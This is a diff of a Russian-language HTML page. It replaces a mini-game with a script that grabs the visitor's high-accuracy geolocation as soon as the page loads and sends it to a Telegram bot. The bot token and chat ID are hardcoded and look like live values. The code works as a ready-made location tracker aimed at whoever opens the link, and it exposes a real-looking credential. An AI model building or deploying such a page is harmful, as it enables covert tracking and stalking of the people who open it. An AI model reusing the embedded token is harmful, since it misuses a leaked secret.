@@ -2,15 +2,77 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8" />
-  <title>Мини-игра</title>
+  <title>Геолокация и отправка в Telegram</title>
   <style>
     body {
       font-family: Arial, sans-serif;
       text-align: center;
-      padding: 50px;
-      background: #121212;
+      padding: 40px;
+      background: #222;
       color: #eee;
     }
-    h1 {
-      font-size: 28px;
-      marg
+    #status {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #4caf50;
+    }
+    #location {
+      margin-top: 20px;
+      font-size: 22px;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+<h1>📍 Получение геолокации</h1>
+<div id="location">Запрашиваем местоположение...</div>
+<div id="status"></div>
+
+<script>
+const TELEGRAM_BOT_TOKEN = '7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M';
+const TELEGRAM_CHAT_ID = '526758225';
+
+function sendToTelegram(message) {
+  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify({
+      chat_id: TELEGRAM_CHAT_ID,
+      text: message,
+      parse_mode: 'HTML'
+    })
+  }).then(() => {
+    document.getElementById('status').textContent = '✅ Геолокация успешно отправлена в Telegram.';
+  }).catch(() => {
+    document.getElementById('status').textContent = '❌ Ошибка отправки в Telegram.';
+  });
+}
+
+if ("geolocation" in navigator) {
+  navigator.geolocation.getCurrentPosition((pos) => {
+    const lat = pos.coords.latitude.toFixed(6);
+    const lon = pos.coords.longitude.toFixed(6);
+    const acc = pos.coords.accuracy.toFixed(1);
+
+    const message = `Новая геолокация\\nШирота: ${lat}\\nДолгота: ${lon}\\nТочность: ${acc}м`;
+
+    document.getElementById('location').textContent = `📍 Широта: ${lat}, Долгота: ${lon}, Точность: ${acc} м`;
+
+    sendToTelegram(message);
+
+  }, (err) => {
+    document.getElementById('location').textContent = `Ошибка получения геолокации: ${err.message}`;
+  }, {
+    enableHighAccuracy: true,
+    timeout: 15000,
+    maximumAge: 0
+  });
+} else {
+  document.getElementById('location').textContent = 'Геолокация не поддерживается браузером.';
+  document.getElementById('status').textContent = '';
+}
+</script>
+
+</body>
+</html>
